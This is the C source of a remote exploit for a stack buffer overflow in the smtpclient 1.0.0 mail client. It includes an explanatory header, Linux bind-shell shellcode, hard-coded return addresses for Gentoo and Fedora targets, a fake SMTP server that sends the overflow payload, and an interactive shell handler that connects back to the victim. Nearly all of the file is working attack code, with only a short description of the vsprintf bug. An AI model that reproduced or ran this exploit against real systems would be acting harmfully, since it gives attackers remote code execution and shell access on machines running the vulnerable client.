/*
*	smtpclient/1.0.0 lame remote exploit
*	keep it private ;) hehehe
*
*	vuln in smtpclient_main.c:
*
*	char buf[1024];
*	[...........]
*    	va_start(ap, str);
*   	vsprintf(buf, str, ap);
*
*	smtpclient 1.0.0 in bsd ports not vuln:
*	vsnprintf(buf, 1024, str, ap);
*
*	its simple stack overflow, size of str not contolled
*	and we may overwrite eip.
*
*	over_g / m00.ru   -   15 jule 04
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>


//shellcodes by eSDee of Netric
char linuxshellcode[]=
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc1\x31\xc0\x31\xdb\x50\x50"
        "\x50\x66\x68\xef\x10\xb3\x02\x66"
        "\x53\x89\xe2\xb3\x10\x53\xb3\x02"
        "\x52\x51\x89\xca\x89\xe1\xb0\x66"
        "\xcd\x80\x31\xdb\x39\xc3\x74\x05"
        "\x31\xc0\x40\xcd\x80\x31\xc0\x50"
        "\x52\x89\xe1\xb3\x04\xb0\x66\xcd"
        "\x80\x89\xd7\x31\xc0\x31\xdb\x31"
        "\xc9\xb3\x11\xb1\x01\xb0\x30\xcd"
        "\x80\x31\xc0\x31\xdb\x50\x50\x57"
        "\x89\xe1\xb3\x05\xb0\x66\xcd\x80"
        "\x89\xc6\x31\xc0\x31\xdb\xb0\x02"
        "\xcd\x80\x39\xc3\x75\x40\x31\xc0"
        "\x89\xfb\xb0\x06\xcd\x80\x31\xc0"
        "\x31\xc9\x89\xf3\xb0\x3e\xfe\xc0\xcd\x80"
        "\x31\xc0\x41\xb0\x3e\xfe\xc0\xcd\x80\x31"
        "\xc0\x41\xb0\x3e\xfe\xc0\xcd\x80\x31\xc0"
        "\x50\x68\x2f\x2f\x73\x68\x68\x2f"
        "\x62\x69\x6e\x89\xe3\x8b\x54\x24"
        "\x08\x50\x53\x89\xe1\xb0\x0b\xcd"
        "\x80\x31\xc0\x40\xcd\x80\x31\xc0"
        "\x89\xf3\xb0\x06\xcd\x80\xeb\x99";


struct {
    char *namever;
    long ret;
    int pos;
    }
    trgtz[]= {

    {"gentoo 1.4.3", 0xbfff9ccc, 1014 }, //usr/portage/net-mail/smtpclient
    {"fedore core 1", 0xbfff9aab, 1014 },
    {"denial-of-service", 0x42424242, 1014 },

    { NULL , 0x0 },};



void usage(char *prg)
{
int i;
printf("usage %s <target> \n targets:\n",prg);
for (i=0;i<=2;i++) printf(" %d. %s\n",i,trgtz[i]);
printf("\n");
exit(-1);
}

int get_shell(char *ip, unsigned short port) {

	fd_set rfds;
	int retVal,r;
	char buf[8096];

	int sockfd;

	struct hostent *hs;
	struct sockaddr_in sock;

	bzero(&sock, sizeof(sock));
	sock.sin_family = AF_INET;
	sock.sin_port   = htons(port);

	if ((sock.sin_addr.s_addr = inet_addr(ip)) == -1) {
		if ((hs = gethostbyname(ip)) == NULL)
			{ printf(" failed\n\n");
			return -1; }

		sock.sin_family = hs->h_addrtype;
		memcpy((caddr_t)&sock.sin_addr.s_addr, hs->h_addr, hs->h_length);
	}

	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		{ printf(" failed\n\n");
		return -1; }

	if(connect(sockfd, (struct sockaddr *)&sock, sizeof(sock)) < 0)
		{ printf(" failed\n\n");
		return -1; }
	printf("ok\n\n");
	send(sockfd,"id;uname -a;\n",13,0);
	do {
		FD_ZERO(&rfds);
		FD_SET(0, &rfds);
		FD_SET(sockfd, &rfds);
		retVal = select(sockfd+1, &rfds, NULL, NULL, NULL);

		if(retVal) {
			if(FD_ISSET(sockfd, &rfds)) {
				buf[(r=recv(sockfd, buf, 8095,0))] = '\0';
				printf("%s", buf);
			}
			if(FD_ISSET(0, &rfds)) {
				buf[(r=read(0, buf, 8095))]='\0';
				send(sockfd, buf, strlen(buf), 0);
			}
		}
	} while(retVal && r);

	close(sockfd);
	return 1;
}

int main(int argc, char *argv[])
{
    int port = 25; // need root )
    char get[501];
    char buf[1201];
    char mbuf[1201];
    char *client;
    struct sockaddr_in mysock;
    struct sockaddr_in lameclient;
    int sockfd,csockfd,saddrlen,msaddrlen;
    int target = 0;

    printf("\n m00-smtpclame.c - lame remote exploit for smtpclient-1.0.0\n");
    printf(" by over_g / m00.ru\n\n");

    if (argc<2) usage(argv[0]);
    if (atoi(argv[1])<3) target = atoi(argv[1]);

    printf("[+] binding fake server on port %d\n",port);

    if ((sockfd = socket(AF_INET,SOCK_STREAM,0)) < 0) {
	printf("[-] couldnt create socket\n\n");
	exit(-1);
    }

    mysock.sin_addr.s_addr = INADDR_ANY;
    mysock.sin_port = htons(port);
    mysock.sin_family = AF_INET;

    if (bind(sockfd, (struct sockaddr *)&mysock,sizeof(mysock)) < 0) {
	printf("[-] couldnt bind()\n\n");
	exit(-1);
    }

    if (listen(sockfd,128) < 0 ) {
	printf("[-] couldnt listen()\n\n");
	exit(-1);
    }
	msaddrlen = sizeof(lameclient);
	printf("[+] using target %d - %s\n[+] ok, waiting for connection\n",target, trgtz[target].namever);

	csockfd = accept(sockfd,(struct sockaddr *)&lameclient,&msaddrlen);
	client = inet_ntoa(lameclient.sin_addr);
	printf("[+] ok, connection from %s\n", client);
	send(csockfd,"220 HI MAN\n",11,0);
	printf("220 HI MAN\n");
	recv(csockfd,get,500,0);
	printf(get);
	printf("[+] sending exploit... ");

	memset(buf,0x90,1200);
	memcpy(&buf[1000-strlen(linuxshellcode)], linuxshellcode,strlen(linuxshellcode));
	memcpy(&buf[trgtz[target].pos],(char *)&trgtz[target].ret,4);
	sprintf(mbuf,"534 %s\n\n",buf);
	send(csockfd,mbuf,strlen(mbuf),0);

	close(sockfd);
	printf("ok\n[+] Connecting to shell...");
	sleep(3);
	get_shell(client,61200);
}

/* da blya, ya znau 4to etot exploit nikomy ne nyzen, vot i ne pizdite,
    ya vse eto delau dlya sebya, zaebali nax	*/
